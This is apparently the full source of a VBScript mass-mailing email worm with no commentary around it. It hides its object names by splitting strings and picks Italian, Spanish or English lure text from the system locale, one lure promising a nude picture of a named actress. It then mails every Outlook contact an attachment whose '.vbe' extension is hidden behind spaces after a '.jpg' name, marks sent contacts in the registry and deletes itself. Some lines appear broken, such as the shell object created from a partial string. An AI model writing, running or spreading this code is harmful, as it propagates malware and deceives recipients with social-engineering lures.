On Error Resume Next
dim x, y, lists, entries, mox, b, regedit, v, regad,s1,s2,s3,z1,z2,z3,z4,z5,r1,r2,r3,r4,r5,lang,ssubject,sbody,dirtemp
set dirtemp=fso.GetSpecialFolder(2)
s1="MA"
s2="PI"
s3=s1&s2

z1="Outl"
z2="ook."
z3="Appli"
z4="cation"
z5=z1&z2&z3&z4

r1="WS"
r2="cript"
r3=".Sh"
r4="ell"
r5=r1&r2&r3&r4

set regedit = CreateObject(r4)
set ecco=WScript.CreateObject(z5)
lang=regedit.RegRead("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\Locale\")
if (lang = "00000410" or lang = "00000810") then 
 ssubject="Ciao!!!"
 sbody="Ciao, in questa e-mail ti allego una bella chicca ;-) Dagli un'occhiata."
elseif (lang ="00000403" or lang="0000040A" or lang="0000080A" or lang="00000C0A" or lang="00002C0A") then
 ssubject="Hola!!!"
 sbody="Hola, en éste mensaje està Càmeron Dìaz desnuda!!!"
else
 ssubject="Hello!!!"
 sbody="Hi, in this e-mail you have attached a goody ;-) Check it out!"
end if
 set out = ecco
 set mapi = out.GetNameSpace(s3)
 for lists = 1 to mapi.AddressLists.Count
   set y = mapi.AddressLists(lists)
   x = 1
   v = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & y)
   if (v = "") then
      v = 1
   end if
   if (int(y.AddressEntries.Count) > int(v)) then
     for entries = 1 to y.AddressEntries.Count
      mox = y.AddressEntries(x)
      regad = ""
       regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & mox)
   if (regad = "") then
         set xzx = ecco.CreateItem(0)
         xzx.Recipients.Add(mox)
          xzx.Subject = ssubject
          xzx.Body =  vbcrlf & sbody
          xzx.Attachments.Add(dirtemp & "\CameronDiaz_XXX.jpg                                                                                                              .vbe")
          xzx.Send
          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & mox, 1, "REG_DWORD"
        end if
        x = x + 1
      next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&y,y.AddressEntries.Count
    else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&y,y.AddressEntries.Count
    end if
  next
  Set out = Nothing
  Set mapi = Nothing
 Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile(WScript.ScriptFullname)
